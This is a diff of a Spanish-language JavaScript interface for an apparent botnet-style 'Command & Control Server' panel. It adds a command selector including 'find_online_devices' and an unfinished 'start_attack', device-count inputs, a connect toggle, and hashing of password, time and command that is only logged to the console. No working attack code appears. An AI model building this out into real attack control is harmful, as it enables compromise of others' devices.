@@ -2,7 +2,8 @@ window.addEventListener('DOMContentLoaded', function () {
     addTooltipListeners();
     addButtonEnviarComandoListener();
     addBuscadorComandosListener();
-    console.log(encryptToSha512(getDateTime()))
+    addCommandSelectListener();
+    addConectarButtonListener();
 });
 
 
@@ -44,7 +45,12 @@ function addBuscadorComandosListener() {
     const opciones = selectOpciones.getElementsByTagName('option');
 
     inputBusqueda.addEventListener('input', function() {
+
         const filtro = inputBusqueda.value.toLowerCase();
+
+        selectOpciones.style.display = 'block';
+
+        selectOpciones.click();
 
         for (let opcion of opciones) {
             const texto = opcion.textContent.toLowerCase();
@@ -54,9 +60,112 @@ function addBuscadorComandosListener() {
                 opcion.style.display = 'none';
             }
         }
-        selectOpciones.click();
-        selectOpciones.selectedIndex = 0;
+
+        for (let opcion of opciones) {
+            if (opcion.style.display !== 'none') {
+                opcion.selected = true;
+                break;
+            }
+        }
+
     });
+}
+
+
+function addCommandSelectListener() {
+    document.getElementById("opciones").addEventListener('change', () => {
+        updateArgumentsInput();
+    });
+}
+
+
+function updateArgumentsInput() {
+    const comandoSelectValue = document.getElementById("opciones").value;
+
+    switch (comandoSelectValue) {
+        case "find_online_devices":
+            loadFindOnlineDevicesInput();
+            break;
+
+        case "start_attack":
+            loadStartAtackInput();
+            break;
+
+        case "placeholder_command":
+            loadFindOnlineDevicesInput();
+            break;
+
+        case "placeholder_command2":
+            loadFindOnlineDevicesInput();
+            break;
+
+        default:
+            loadFindOnlineDevicesInput();
+            break;
+    }
+}
+
+
+function loadFindOnlineDevicesInput() {
+    const divArgumentos = document.getElementById("divArgumentos");
+
+    divArgumentos.innerHTML = "";
+
+    const label1 = document.createElement("label");
+    label1.setAttribute("for", "deviceType");
+    label1.textContent = "TIPO DE DISPOSITIVO";
+
+    const input1 = document.createElement("input");
+    input1.setAttribute("type", "text");
+    input1.setAttribute("id", "deviceType");
+    input1.setAttribute("placeholder", "Introduce el tipo de dispositivo");
+
+    const br = document.createElement("br");
+
+    const label2 = document.createElement("label");
+    label2.setAttribute("for", "deviceAmount");
+    label2.textContent = "CANTIDAD DE DISPOSITIVOS";
+
+    const input2 = document.createElement("input");
+    input2.setAttribute("type", "text");
+    input2.setAttribute("id", "deviceAmount");
+    input2.setAttribute("placeholder", "Introduce la cantidad");
+
+    divArgumentos.appendChild(label1);
+    divArgumentos.appendChild(input1);
+    divArgumentos.appendChild(br);
+    divArgumentos.appendChild(label2);
+    divArgumentos.appendChild(input2);
+}
+
+
+
+function loadStartAtackInput() {
+    const divArgumentos = document.getElementById("divArgumentos");
+
+    divArgumentos.innerHTML = "";
+
+    // TODO
+}
+
+
+function addConectarButtonListener() {
+    document.getElementById("buttonConexion").addEventListener('click', () => {
+        updateConnectionStatus();
+    });
+}
+
+
+function updateConnectionStatus() {
+    const connected = !(document.getElementById("buttonEnviarComando").disabled);
+
+    if (connected) {
+        document.getElementById("buttonEnviarComando").disabled = true;
+        document.getElementById("buttonConexion").innerHTML = "CONECTAR";
+    } else {
+        document.getElementById("buttonEnviarComando").disabled = false;
+        document.getElementById("buttonConexion").innerHTML = "DESCONECTAR";
+    }
 }
 
 
@@ -80,8 +189,53 @@ function getDateTime() {
 // Function to send command to the Command & Control Server
 function sendCommand() {
     const contraInput = document.getElementById("contra");
+    const comandoSelect = document.getElementById("opciones");
 
-    let encriptedContra = encryptToSha512(contraInput.value);
+    let contraEncrypted = encryptToSha512(contraInput.value);
+    let dateTimeEncrypted = encryptToSha512(getDateTime());
+    let comandoEncrypted = encryptToSha512(comandoSelect.value);
 
-    console.log(encriptedContra);
+    const stringToSend = contraEncrypted + ";;" + dateTimeEncrypted + ";;" + comandoEncrypted + ";;";
+
+    console.log(stringToSend);
+
+    buttonSendCommandIsDisabled(true);
+
+    setTimeout(function() {
+        buttonSendCommandIsDisabled(false);
+    }, 2000);
+
+    let tiempoRestante = 2000;
+    const intervalo = 100;
+
+    const intervalID = setInterval(function() {
+
+        tiempoRestante -= intervalo;
+
+        if (tiempoRestante <= 0) {
+            clearInterval(intervalID);
+
+            document.getElementById("buttonTimer").textContent = "0.0";
+        } else {
+            actualizarTiempo(tiempoRestante);
+        }
+    }, intervalo);
+}
+
+
+function buttonSendCommandIsDisabled(disabled) {
+    document.getElementById("buttonEnviarComando").disabled = disabled;
+
+    if (disabled) {
+        document.getElementById("buttonTimer").style.visibility = 'visible';
+    } else {
+        document.getElementById("buttonTimer").style.visibility = 'hidden';
+    }
+}
+
+
+function actualizarTiempo(tiempoRestante) {
+    const segundos = tiempoRestante / 1000;
+
+    document.getElementById("buttonTimer").textContent = segundos.toFixed(1);
 }
